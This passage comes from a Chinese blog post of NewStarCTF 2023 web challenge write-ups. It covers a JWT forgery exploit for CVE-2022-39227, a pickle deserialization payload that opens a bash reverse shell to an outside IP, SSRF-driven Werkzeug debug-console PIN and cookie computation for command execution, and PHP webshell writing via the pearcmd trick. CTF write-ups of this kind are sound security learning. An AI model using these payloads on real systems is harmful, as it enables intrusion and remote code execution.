class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="keyword">import</span> base64</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> jwcrypto.jwk <span class="keyword">as</span> jwk</span><br><span class="line"><span class="keyword">import</span> pickle</span><br><span class="line"><span class="keyword">from</span> python_jwt <span class="keyword">import</span> *</span><br><span class="line">app = Flask(__name__)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">generate_random_string</span>(<span class="params">length=<span class="number">16</span></span>):</span><br><span class="line">    characters = string.ascii_letters + string.digits  <span class="comment"># 包含字母和数字</span></span><br><span class="line">    random_string = <span class="string">&#x27;&#x27;</span>.join(random.choice(characters) <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(length))</span><br><span class="line">    <span class="keyword">return</span> random_string</span><br><span class="line">app.config[<span class="string">&#x27;SECRET_KEY&#x27;</span>] = generate_random_string(<span class="number">16</span>)</span><br><span class="line">key = jwk.JWK.generate(kty=<span class="string">&#x27;RSA&#x27;</span>, size=<span class="number">2048</span>)</span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&quot;/&quot;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">index</span>():</span><br><span class="line">    payload=request.args.get(<span class="string">&quot;token&quot;</span>)</span><br><span class="line">    <span class="keyword">if</span> payload:</span><br><span class="line">        token=verify_jwt(payload, key, [<span class="string">&#x27;PS256&#x27;</span>])</span><br><span class="line">        session[<span class="string">&quot;role&quot;</span>]=token[<span class="number">1</span>][<span class="string">&#x27;role&#x27;</span>]</span><br><span class="line">        <span class="keyword">return</span> render_template(<span class="string">&#x27;index.html&#x27;</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        session[<span class="string">&quot;role&quot;</span>]=<span class="string">&quot;guest&quot;</span></span><br><span class="line">        user=&#123;<span class="string">&quot;username&quot;</span>:<span class="string">&quot;boogipop&quot;</span>,<span class="string">&quot;role&quot;</span>:<span class="string">&quot;guest&quot;</span>&#125;</span><br><span class="line">        jwt = generate_jwt(user, key, <span class="string">&#x27;PS256&#x27;</span>, timedelta(minutes=<span class="number">60</span>))</span><br><span class="line">        <span class="keyword">return</span> render_template(<span class="string">&#x27;index.html&#x27;</span>,token=jwt)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&quot;/pickle&quot;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">unser</span>():</span><br><span class="line">    <span class="keyword">if</span> session[<span class="string">&quot;role&quot;</span>]==<span class="string">&quot;admin&quot;</span>:</span><br><span class="line">        pickle.loads(base64.b64decode(request.args.get(<span class="string">&quot;pickle&quot;</span>)))</span><br><span class="line">        <span class="keyword">return</span> render_template(<span class="string">&quot;index.html&quot;</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> render_template(<span class="string">&quot;index.html&quot;</span>)</span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    app.run(host=<span class="string">&quot;0.0.0.0&quot;</span>, port=<span class="number">5000</span>, debug=<span class="literal">True</span>)</span><br><span class="line"></span><br></pre></td></tr></table></figure></div><p>两个路由</p><ol><li>一个是根目录，用来验证jwt，并修改session中role的值的。</li><li>一个是<code>\pickle</code>用来触发反序列化，通过pickle.loads函数，条件是session中的role是admin才行，所以我们需要通过<code>\</code>路由来构造出role为admin的session再传到<code>\pickle</code>下，然后构造准备被反序列化的payload：pickle。</li></ol><p>所以这里该怎么伪造jwt呢，我们没有密钥，而且根据源码来看密钥的生成比较复杂，也不太可能破解。但是这里有一个漏洞：CVE-2022-39227<br><a class="link" target="_blank" rel="noopener" href="https://forum.butian.net/share/1990">CVE-2022-39227漏洞分析 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p><p>漏洞exp：</p><div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> json <span class="keyword">import</span> loads, dumps</span><br><span class="line"><span class="keyword">from</span> jwcrypto.common <span class="keyword">import</span> base64url_encode, base64url_decode</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">topic</span>(<span class="params">topic</span>):</span><br><span class="line">    <span class="string">&quot;&quot;&quot; Use mix of JSON and compact format to insert forged claims including long expiration &quot;&quot;&quot;</span></span><br><span class="line">    [header, payload, signature] = topic.split(<span class="string">&#x27;.&#x27;</span>)</span><br><span class="line">    parsed_payload = loads(base64url_decode(payload))</span><br><span class="line">    <span class="built_in">print</span>(parsed_payload)</span><br><span class="line">    parsed_payload[<span class="string">&quot;role&quot;</span>] = <span class="string">&quot;admin&quot;</span></span><br><span class="line">    <span class="built_in">print</span>(dumps(parsed_payload, separators=(<span class="string">&#x27;,&#x27;</span>, <span class="string">&#x27;:&#x27;</span>)))</span><br><span class="line">    fake_payload = base64url_encode((dumps(parsed_payload, separators=(<span class="string">&#x27;,&#x27;</span>, <span class="string">&#x27;:&#x27;</span>))))</span><br><span class="line">    <span class="built_in">print</span>(fake_payload)</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;&#123;&quot; &#x27;</span> + header + <span class="string">&#x27;.&#x27;</span> + fake_payload + <span class="string">&#x27;.&quot;:&quot;&quot;,&quot;protected&quot;:&quot;&#x27;</span> + header + <span class="string">&#x27;&quot;, &quot;payload&quot;:&quot;&#x27;</span> + payload + <span class="string">&#x27;&quot;,&quot;signature&quot;:&quot;&#x27;</span> + signature + <span class="string">&#x27;&quot;&#125; &#x27;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(topic(<span class="string">&#x27;eyJhbGciOiJQUzI1NiIsInR5cCI6IkpXVCJ9.eyJleHAiOjE3MDAxMzYzNjAsImlhdCI6MTcwMDEzMjc2MCwianRpIjoiZXZsQWVHUmlodWRrNDBETlJ2N1Z5USIsIm5iZiI6MTcwMDEzMjc2MCwicm9sZSI6Imd1ZXN0IiwidXNlcm5hbWUiOiJib29naXBvcCJ9.SFA59zDsBWL7kUzCRVxg-IHP3ED5otnV2dwu39OsBSkG44KfTIbRzy1sa17Bx2konwe9FF5rmxHmPz8w5u7oA__i5iCUYtfXvwIEQG8hNnh3-wsW1GruWrAAdNnXFBKLzrH84T-jL2IG_Ii8cwulX06a47xxFd21hkqyKyQG3zKRLUCjPpGRHudUgimGYahW9mYvuQ3ctS46ORi5CO_HBjgdasGlfm1BM6OC_9IpzlrFt1-pz49zHoRWTdviiDskmSVTTxOcTiiZN14844IgPK9H95zSN2YZFP8Pj_3xpy_z0dOWZA-i-osW-pLGHqNvDUSdYuDuuaec5gIMePQq0w&#x27;</span>))</span><br><span class="line"></span><br></pre></td></tr></table></figure></div><p>利用了json格式来注入，不懂。<br>总之上传了伪造的jwt之后，服务器返回给我们一个role为admin的session<br><img lazyload src="/images/loading.svg" data-src="https://sh7err-1316594865.cos.ap-nanjing.myqcloud.com/pictures/pickle_session.PNG"><br>我们用这个session在&#x2F;pickle路由下传payload，payload构造：</p><div class="highlight-container" data-rel="Py"><figure class="iseeu highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> base64</span><br><span class="line">opcode=<span class="string">b&#x27;&#x27;&#x27;cos</span></span><br><span class="line"><span class="string">system</span></span><br><span class="line"><span class="string">(S&quot;bash -c &#x27;bash -i &gt;&amp; /dev/tcp/115.236.153.177/44202 0&gt;&amp;1&#x27;&quot;</span></span><br><span class="line"><span class="string">tR.</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="built_in">print</span>(base64.b64encode(opcode))</span><br></pre></td></tr></table></figure></div><p>这里的payload构造可以参考：<br><a class="link" target="_blank" rel="noopener" href="https://zhuanlan.zhihu.com/p/25981037">Python Pickle的任意代码执行漏洞实践和Payload构造 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a><br>反弹shell后拿到flag<br><img lazyload src="/images/loading.svg" data-src="https://sh7err-1316594865.cos.ap-nanjing.myqcloud.com/pictures/pickle_flag.PNG"></p><h2 id="pppython"><a href="#pppython" class="headerlink" title="pppython?"></a>pppython?</h2><blockquote><p>考点：python代码审计，flask pin码计算</p></blockquote><p>源码如下：</p><div class="highlight-container" data-rel="Php"><figure class="iseeu highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span></span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span> (<span class="variable">$_REQUEST</span>[<span class="string">&#x27;hint&#x27;</span>] == [<span class="string">&quot;your?&quot;</span>, <span class="string">&quot;mine!&quot;</span>, <span class="string">&quot;hint!!&quot;</span>])&#123;</span><br><span class="line">        <span class="title function_ invoke__">header</span>(<span class="string">&quot;Content-type: text/plain&quot;</span>);</span><br><span class="line">        <span class="title function_ invoke__">system</span>(<span class="string">&quot;ls / -la&quot;</span>);</span><br><span class="line">        <span class="keyword">exit</span>();</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="variable">$ch</span> = <span class="title function_ invoke__">curl_init</span>();</span><br><span class="line">        <span class="title function_ invoke__">curl_setopt</span>(<span class="variable">$ch</span>, CURLOPT_URL, <span class="variable">$_REQUEST</span>[<span class="string">&#x27;url&#x27;</span>]);</span><br><span class="line">        <span class="title function_ invoke__">curl_setopt</span>(<span class="variable">$ch</span>, CURLOPT_CONNECTTIMEOUT, <span class="number">60</span>);</span><br><span class="line">        <span class="title function_ invoke__">curl_setopt</span>(<span class="variable">$ch</span>, CURLOPT_HTTPHEADER, <span class="variable">$_REQUEST</span>[<span class="string">&#x27;lolita&#x27;</span>]);</span><br><span class="line">        <span class="variable">$output</span> = <span class="title function_ invoke__">curl_exec</span>(<span class="variable">$ch</span>);</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$output</span>;</span><br><span class="line">        <span class="title function_ invoke__">curl_close</span>(<span class="variable">$ch</span>);   </span><br><span class="line">    &#125;<span class="keyword">catch</span> (<span class="built_in">Error</span> <span class="variable">$x</span>)&#123;</span><br><span class="line">        <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">        <span class="title function_ invoke__">highlight_string</span>(<span class="variable">$x</span>-&gt;<span class="title function_ invoke__">getMessage</span>());</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span> </span><br><span class="line"></span><br></pre></td></tr></table></figure></div><p>用数组传hint参数，利用hint可以看到根目录下面有哪些文件和权限，可以看到flag文件只有root用户可以读写<br><img lazyload src="/images/loading.svg" data-src="https://sh7err-1316594865.cos.ap-nanjing.myqcloud.com/pictures/pppython_hint.PNG"><br>题目帮我们构造了ssrf漏洞，我们顺着它向目的服务发请求就可以了。因为已经知道了根目录下面的文件，利用<code>file://</code>伪协议来读取这些文件就可以了，看一下app.py<br><img lazyload src="/images/loading.svg" data-src="https://sh7err-1316594865.cos.ap-nanjing.myqcloud.com/pictures/pppython_apppy.PNG"><br>服务部署在0.0.0.0:1314,开启了debug模式。那么首先想到的就是输入pin码进入debug模式。<br>计算pin码：</p><div class="highlight-container" data-rel="Py"><figure class="iseeu highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"><span class="keyword">from</span> itertools <span class="keyword">import</span> chain</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line">probably_public_bits = [</span><br><span class="line">    <span class="string">&#x27;root&#x27;</span>  <span class="comment"># username 启动这个 Flask 的用户，在/etc/passwd中查看</span></span><br><span class="line">    <span class="string">&#x27;flask.app&#x27;</span>,  <span class="comment"># modname 一般默认 flask.app</span></span><br><span class="line">    <span class="string">&#x27;Flask&#x27;</span>,  <span class="comment"># getattr(app, &#x27;__name__&#x27;, getattr(app.__class__, &#x27;__name__&#x27;)) 一般默认 flask.app 为 Flask</span></span><br><span class="line">    <span class="string">&#x27;/usr/local/lib/python3.10/dist-packages/flask/app.py&#x27;</span>  <span class="comment"># getattr(mod, &#x27;__file__&#x27;, None)为 flask 目录下的一个 app.py 的绝对路径,可在爆错页面看到</span></span><br><span class="line">]</span><br><span class="line"></span><br><span class="line">private_bits = [</span><br><span class="line">    <span class="string">&#x27;68736292551648&#x27;</span>,  <span class="comment"># str(uuid.getnode()) 则是网卡 MAC 地址的十进制表达式，读取/sys/class/net/eth0/address文件 将mac地址转换为十进制</span></span><br><span class="line">    <span class="string">&#x27;8cab9c97-85be-4fb4-9d17-29335d7b2b8adocker-c32efbba59930cde598239e49b7b0f563290b33bdecfa88f347f2056c1cef055.scope&#x27;</span> <span class="comment">#get_machine_id() 系统 id</span></span><br><span class="line">     </span><br><span class="line"><span class="comment">#machine_id由三个合并(docker就后两个)：1. /etc/machine-id   2./proc/sys/kernel/random/boot_id 3./proc/self/cgroup</span></span><br><span class="line">]</span><br><span class="line"></span><br><span class="line"><span class="comment"># 下面为源码里面抄的，不需要修改</span></span><br><span class="line">h = hashlib.sha1()</span><br><span class="line"><span class="keyword">for</span> bit <span class="keyword">in</span> chain(probably_public_bits, private_bits):</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> bit:</span><br><span class="line">        <span class="keyword">continue</span></span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">isinstance</span>(bit, <span class="built_in">str</span>):</span><br><span class="line">        bit = bit.encode(<span class="string">&#x27;utf-8&#x27;</span>)</span><br><span class="line">    h.update(bit)</span><br><span class="line">h.update(<span class="string">b&#x27;cookiesalt&#x27;</span>)</span><br><span class="line"></span><br><span class="line">cookie_name = <span class="string">&#x27;__wzd&#x27;</span> + h.hexdigest()[:<span class="number">20</span>]</span><br><span class="line"></span><br><span class="line">num = <span class="literal">None</span></span><br><span class="line"><span class="keyword">if</span> num <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">    h.update(<span class="string">b&#x27;pinsalt&#x27;</span>)</span><br><span class="line">    num = (<span class="string">&#x27;%09d&#x27;</span> % <span class="built_in">int</span>(h.hexdigest(), <span class="number">16</span>))[:<span class="number">9</span>]</span><br><span class="line"></span><br><span class="line">rv = <span class="literal">None</span></span><br><span class="line"><span class="keyword">if</span> rv <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">    <span class="keyword">for</span> group_size <span class="keyword">in</span> <span class="number">5</span>, <span class="number">4</span>, <span class="number">3</span>:</span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">len</span>(num) % group_size == <span class="number">0</span>:</span><br><span class="line">            rv = <span class="string">&#x27;-&#x27;</span>.join(num[x:x + group_size].rjust(group_size, <span class="string">&#x27;0&#x27;</span>)</span><br><span class="line">                          <span class="keyword">for</span> x <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="built_in">len</span>(num), group_size))</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        rv = num</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(rv)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">hash_pin</span>(<span class="params">pin: <span class="built_in">str</span></span>) -&gt; <span class="built_in">str</span>:</span><br><span class="line">    <span class="keyword">return</span> hashlib.sha1(<span class="string">f&quot;<span class="subst">&#123;pin&#125;</span> added salt&quot;</span>.encode(<span class="string">&quot;utf-8&quot;</span>, <span class="string">&quot;replace&quot;</span>)).hexdigest()[:<span class="number">12</span>]</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(cookie_name + <span class="string">&quot;=&quot;</span> + <span class="string">f&quot;<span class="subst">&#123;<span class="built_in">int</span>(time.time())&#125;</span>|<span class="subst">&#123;hash_pin(rv)&#125;</span>&quot;</span>)</span><br><span class="line"></span><br></pre></td></tr></table></figure></div><p>这里同时也算出了cookie，不知道为什么在0.0.0.0:1314&#x2F;console中输入pin码并不能进入debug模式，而是直接返回了最开始的页面。</p><p>那么就尝试使用cookie来绕过输入pin码的机制，按道理来说有生成了pin码的同时也生成了cookie？在url中进入对应服务并尝试进入debug模式，再用lolita参数输入cookie。</p><p>payload还需要frm和s,</p><blockquote><p>frm如果没有报错信息的话值为0<br>s的值可以直接访问.&#x2F;console，然后查看源码的SECRET值<br><img lazyload src="/images/loading.svg" data-src="https://sh7err-1316594865.cos.ap-nanjing.myqcloud.com/pictures/pppython_secret.PNG"><br>payload:</p></blockquote><div class="highlight-container" data-rel="Plaintext"><figure class="iseeu highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">/?url=http://localhost:1314/console?%26__debugger__%3dyes%26cmd%3d__import__(%22os%22).popen(%22cat%2B/flag%22).read()%26frm%3d0%26s%3dj8UbhFUORfOyCAhcghMA&amp;lolita[]=Cookie:%20__wzde60d99ac616efe995a88=1700536266|961695fb0402</span><br><span class="line">```  </span><br><span class="line">服务器端会对传过去的参数url解码两次，所以对空格要编码两次，你可以使用`%2B`来代替，因为它会被解码成`+`，`+`在url中表示空格。或者你可以用`%2520`来代替，因为它第一次解码为`%20`,第二次解码为空格。我觉得可以用`%252B`来测试一下。  </span><br><span class="line">![](https://sh7err-1316594865.cos.ap-nanjing.myqcloud.com/pictures/pppython_test.PNG)  </span><br><span class="line">可以看到`%252B`被解析成了普通字符`+`，而不是特殊字符`+`。我一直都对些编码处理有点疑惑，以后完全懂了有机会一定要写一篇来记录一下。  </span><br><span class="line">![](https://sh7err-1316594865.cos.ap-nanjing.myqcloud.com/pictures/pppython_flag.PNG)  </span><br><span class="line">## 4-复盘  </span><br><span class="line">这题就是利用pearcmd的trick来打，过程不在赘述了，我想分享一下我在利用这个trick中遇到的一些疑惑与思考。  </span><br><span class="line">首先根据p牛的文章我们能知道这个trick的原理和payload，p牛的payload如下：  </span><br><span class="line">`/index.php?+config-create+/&amp;file=/usr/local/lib/php/pearcmd.php&amp;/&lt;?=phpinfo()?&gt;+/tmp/hello.php`  </span><br><span class="line">index.php应该是一个具有文件包含漏洞的php文件，如果按照$_SERVER[&#x27;argv&#x27;]的解析方式（以`+`为参数分隔符），那么在这个文件中出现了四个部分：  </span><br><span class="line">`array(4) &#123; [0]=&gt; string(0) &quot;&quot; [1]=&gt; string(13) &quot;config-create&quot; [2]=&gt; string(74) &quot;/&amp;xzz=/../../../../../usr/local/lib/php/pearcmd&amp;/%3C?=@eval($_POST[1])?%3E&quot; [3]=&gt; string(19) &quot;/var/www/html/2.php&quot; &#125; `  </span><br><span class="line"></span><br><span class="line">1. 空字符，但是却必须要在config-create前面添加一个参数，否则就无法成功，原因未知。  </span><br><span class="line">2. `config-create`，pear的参数之一，通过该命令我们可以创建一个配置文件，参数有二：一是一个绝对路径，必须以`\`开头，二是你创建的配置文件</span><br><span class="line">3. `/&amp;file=/usr/local/lib/php/pearcmd.php&amp;/&lt;?=phpinfo()?&gt;`,由2知这其实是`config-create`的第一个参数，所以它必须是绝对路径，因此开头有个`\`，然后这里的`&amp;`表示在$_GET解析方式中的参数分隔符，所以需要添加，否则会导致要被文件包含的文件名出现错误。但是它不会对我们传webshell有任何印象，因为php标签的存在。</span><br><span class="line">4. `/tmp/hello.php`，这是包含了webshell的文件，，根据实际情况可以更名，比如如果想要在网站根目录下getshell，则可以尝试写为`/var/www/html/1.php`  </span><br><span class="line"></span><br><span class="line">我用一段简单的php代码来表示这其中的关系：  </span><br><span class="line">```php</span><br><span class="line">&lt;?php</span><br><span class="line">$a=$_SERVER[&#x27;argv&#x27;];</span><br><span class="line">$b=$_GET[&#x27;xzz&#x27;];</span><br><span class="line">var_dump($_SERVER[&#x27;argv&#x27;]);</span><br><span class="line">echo &#x27;&lt;br&gt;&#x27;;</span><br><span class="line">var_dump($argv);</span><br><span class="line">echo &#x27;&lt;br&gt;&#x27;;</span><br><span class="line">var_dump($b);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure></div><p>它的结果是：<br><img lazyload src="/images/loading.svg" data-src="https://sh7err-1316594865.cos.ap-nanjing.myqcloud.com/pictures/pearcmd_test.PNG"><br>同时p牛的payload也可以更改为<code>page=/../../../../../usr/local/lib/php/pearcmd&amp;+config-create+/&lt;?=@eval($_POST[2])?&gt;+/var/www/html/2.php</code><br>也就是说我把<code>config-create</code>更改到了第二个参数的位置，这仍然可以运行。<br><img lazyload src="/images/loading.svg" data-src="https://sh7err-1316594865.cos.ap-nanjing.myqcloud.com/pictures/pearcmd_shell.PNG"><br>也是成功拿到flag<br><img lazyload src="/images/loading.svg" data-src="https://sh7err-1316594865.cos.ap-nanjing.myqcloud.com/pictures/pearcmd_flag.PNG"></p></div><div class="post-copyright-info"><div class="article-copyright-info-container"><ul><li><strong>Title:</strong> newstarctf2023一些web题记录</li><li><strong>Author:</strong> Sh7err</li><li><strong>Created at :</strong> 2023-10-10 19:03:48</li><li><strong>Updated at :</strong> 2023-11-30 20:36:42</li><li><strong>Link:</strong> https://xzzz111.github.io/2023/10/10/2023newstarctf/</li><li><strong>License: </strong>This work is licensed under <a class="license" target="_blank" rel="noopener" href="https://creativecommons.org/licenses/by-nc-sa/4.0/deed.zh">CC BY-NC-SA 4.0</a>.</li></ul></div></div><ul class="post-tags-box"><li class="tag-item"><a href="/tags/ctf/">#ctf</a>&nbsp;</li><li class="tag-item"><a href="/tags/%E6%97%A0%E5%8F%82rce/">#无参rce</a>&nbsp;</li><li class="tag-item"><a href="/tags/pop/">#pop</a>&nbsp;</li><li class="tag-item"><a href="/tags/unserialize/">#unserialize</a>&nbsp;</li><li class="tag-item"><a href="/tags/%E6%97%B6%E9%97%B4%E7%9B%B2%E6%B3%A8/">#时间盲注</a>&nbsp;</li></ul><div class="article-nav"><div class="article-prev"><a class="prev" rel="prev" href="/2023/12/03/js%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93/"><span class="left arrow-icon flex justify-center items-center"><i class="fa-solid fa-chevron-left"></i> </span><span class="title flex justify-center items-center"><span class="post-nav-title-item">js原型链污染</span> <span class="post-nav-item">Prev posts</span></span></a></div><div class="article-next"><a class="next" rel="next" href="/2023/09/21/nssround13-web/"><span class="title flex justify-center items-center"><span class="post-nav-title-item">nssround13_web</span> <span class="post-nav-item">Next posts</span> </span><span class="right arrow-icon flex justify-center items-center"><i class="fa-solid fa-chevron-right"></i></span></a></div></div><div class="comment-container"><div class="comments-container pjax"><div id="comment-anchor"></div><div class="comment-area-title"><i class="fa-solid fa-comments"></i>&nbsp;Comments</div><div id="waline"></div><script type="module" data-swup-reload-script>import{init}from"https://evan.beee.top/js/waline.mjs";function loadWaline(){init({el:"#waline",serverURL:"https://xzzz111.github.io",lang:"zh-CN",dark:'body[class~="dark-mode"]',requiredMeta:["nick","mail"]})}{const e=setTimeout(()=>{loadWaline(),clearTimeout(e)},1e3)}</script></div></div></div><div class="toc-content-container"><div class="post-toc-wrap"><div class="post-toc"><div class="toc-title">On this page</div><div class="page-title">newstarctf2023一些web题记录</div><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#week2"><span class="nav-text">week2</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#R-C-E"><span class="nav-text">R!!C!!E!!</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#week3"><span class="nav-text">week3</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#POP-Gadget"><span class="nav-text">POP Gadget</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#R-C-E-1"><span class="nav-text">R!!!C!!!E!!!</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#week4"><span class="nav-text">week4</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#midsql"><span class="nav-text">midsql</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#flask-disk"><span class="nav-text">flask disk</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#pharone"><span class="nav-text">pharone</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#injectme"><span class="nav-text">injectme</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#week-5"><span class="nav-text">week 5</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#final"><span class="nav-text">final</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#ye%E2%80%99spickle"><span class="nav-text">ye’spickle</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#pppython"><span class="nav-text">pppython?</span></a></li></ol></li></ol></div></div></div></div></div></div><div class="main-content-footer"><footer class="footer mt-5 py-5 h-auto text-base text-third-text-color relative border-t-2 border-t-border-color"><div class="info-container py-3 text-center"><div class="text-center">&copy; <span>2023</span> - 2024&nbsp;&nbsp;<i class="fa-solid fa-heart fa-beat" style="--fa-animation-duration:0.5s;color:#f54545"></i>&nbsp;&nbsp;<a href="/">Sh7err</a></div><script data-swup-reload-script src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script><div class="relative text-center lg:absolute lg:right-[20px] lg:top-1/2 lg:-translate-y-1/2 lg:text-right"><span id="busuanzi_container_site_uv" class="lg:!block"><span class="text-sm">VISITOR COUNT</span> <span id="busuanzi_value_site_uv"></span> </span><span id="busuanzi_container_site_pv" class="lg:!block"><span class="text-sm">TOTAL PAGE VIEWS</span> <span id="busuanzi_value_site_pv"></span></span></div><div class="relative text-center lg:absolute lg:left-[20px] lg:top-1/2 lg:-translate-y-1/2 lg:text-left"><span class="lg:block text-sm">POWERED BY <?xml version="1.0" encoding="utf-8"?><!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.1//EN" "http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd"><svg class="relative top-[2px] inline-block align-baseline" version="1.1" id="圖層_1" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" x="0px" y="0px" width="1rem" height="1rem" viewBox="0 0 512 512" enable-background="new 0 0 512 512" xml:space="preserve"><path fill="#0E83CD" d="M256.4,25.8l-200,115.5L56,371.5l199.6,114.7l200-115.5l0.4-230.2L256.4,25.8z 